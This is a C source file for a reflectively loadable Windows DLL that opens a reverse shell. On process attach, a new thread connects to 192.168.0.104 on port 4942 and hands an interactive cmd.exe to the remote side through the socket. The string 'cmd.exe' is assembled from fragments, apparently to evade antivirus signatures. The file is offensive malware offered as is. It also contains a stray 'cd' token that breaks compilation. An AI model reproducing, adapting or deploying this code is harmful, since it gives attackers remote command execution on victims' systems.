//===============================================================================================//
// Small Netcat Shell
//===============================================================================================//
#include "ReflectiveLoader.h"
#include <stdio.h>
#include <string.h>
#include <WinSock2.h>

extern HINSTANCE hAppInstance;
//===============================================================================================//

DWORD WINAPI shell()
{
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    int res = WSAStartup(MAKEWORD(2,2), &wsa);
    if (res != 0)
    {cd
        fprintf(stderr, "Can't initialize Winsock. Error %d\n", res);
        return 1;
    }

    // optional: use WSAEnumProtocols() to find a suitable WSAPROTOCOL_INFO
    // to pass to the lpProtocolInfo parameter of WSASocket()...

    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET)
    {
        res = WSAGetLastError();
        fprintf(stderr, "Can't create socket. Error %d\n", res);
        WSACleanup();
        return 1;
    }

    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(4942);
    server.sin_addr.s_addr = inet_addr("192.168.0.104");

    res = WSAConnect(sock, (struct sockaddr*)&server, sizeof(server), NULL, NULL, NULL, NULL);
    if (res == SOCKET_ERROR)
    {
        res = WSAGetLastError();
        fprintf(stderr, "Can't connect. Error %d\n", res);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)sock;

    char *myArray[4] = { "cm", "d.e", "x", "e" };
    char command[8] = "";
    snprintf(command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]);
    if (!CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo))
    {
        res = GetLastError();
        fprintf(stderr, "Can't create process. Error %d\n", res);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    CloseHandle(pinfo.hThread);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);

    closesocket(sock);
    WSACleanup();

    return 0;
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			CreateThread(NULL, 0, shell, NULL, 0, NULL);
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}